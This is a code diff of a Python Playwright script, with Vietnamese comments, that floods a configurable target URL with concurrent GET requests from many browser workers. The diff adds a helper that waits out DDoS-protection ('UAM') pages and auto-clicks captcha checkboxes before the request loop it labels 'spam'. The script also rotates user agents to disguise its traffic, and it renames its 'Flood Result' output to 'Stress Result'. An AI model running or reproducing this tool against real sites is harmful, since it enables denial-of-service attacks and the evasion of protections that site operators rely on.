@@ -4,10 +4,11 @@ import time
 import os
 from playwright.async_api import async_playwright
 
+# ===================== CONFIG =====================
 TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
-DURATION = int(os.getenv("DURATION", "20"))   # giây
-CONCURRENCY = int(os.getenv("CONCURRENCY", "30"))  # số tab song song
-REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5"))  # số request song song mỗi vòng/tab
+DURATION = int(os.getenv("DURATION", "20"))        # giây
+CONCURRENCY = int(os.getenv("CONCURRENCY", "5"))  # số worker song song
+REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "3"))  # số request song song mỗi vòng/tab
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
@@ -16,10 +17,35 @@ USER_AGENTS = [
 ]
 ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]
 
+# ===================== GLOBAL =====================
 success = 0
 fail = 0
 status_count = {}
 
+# ===================== HELPER =====================
+async def pass_protection(page, worker_id):
+    """Pass UAM + captcha nếu có"""
+    try:
+        print(f"[Worker {worker_id}] Visiting {TARGET_URL} to pass UAM...")
+        await page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
+
+        # Chờ UAM 5s
+        await asyncio.sleep(8)
+
+        # Check xem có captcha checkbox không
+        for frame in page.frames:
+            if "captcha" in frame.url.lower():
+                checkbox = await frame.query_selector("input[type=checkbox]")
+                if checkbox:
+                    print(f"[Worker {worker_id}] Clicking captcha checkbox...")
+                    await checkbox.click()
+                    await asyncio.sleep(5)  # chờ xác nhận
+        print(f"[Worker {worker_id}] UAM/Captcha passed!")
+
+    except Exception as e:
+        print(f"[Worker {worker_id}] Error while passing protection: {e}")
+
+# ===================== WORKER =====================
 async def attack(playwright, worker_id):
     global success, fail, status_count
 
@@ -40,12 +66,17 @@ async def attack(playwright, worker_id):
         user_agent=ua,
         extra_http_headers={"Accept-Language": lang}
     )
+    page = await context.new_page()
 
+    # Pass UAM + Captcha trước
+    await pass_protection(page, worker_id)
+
+    # Bắt đầu spam
     start = time.time()
     while time.time() - start < DURATION:
         tasks = []
         for _ in range(REQ_PER_LOOP):
-            tasks.append(context.request.get(TARGET_URL, timeout=10000))
+            tasks.append(page.request.get(TARGET_URL, timeout=15000))
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         for res in results:
@@ -62,13 +93,14 @@ async def attack(playwright, worker_id):
 
     await browser.close()
 
+# ===================== MAIN =====================
 async def main():
     async with async_playwright() as p:
-        tasks = [attack(p, i) for i in range(CONCURRENCY)]
+        tasks = [attack(p, i + 1) for i in range(CONCURRENCY)]
         await asyncio.gather(*tasks)
 
     total = success + fail
-    print(f"\n=== Flood Result ===")
+    print(f"\n=== Stress Result ===")
     print(f"Total requests: {total}")
     print(f"Success (2xx): {success}")
     print(f"Fail/Blocked: {fail}")
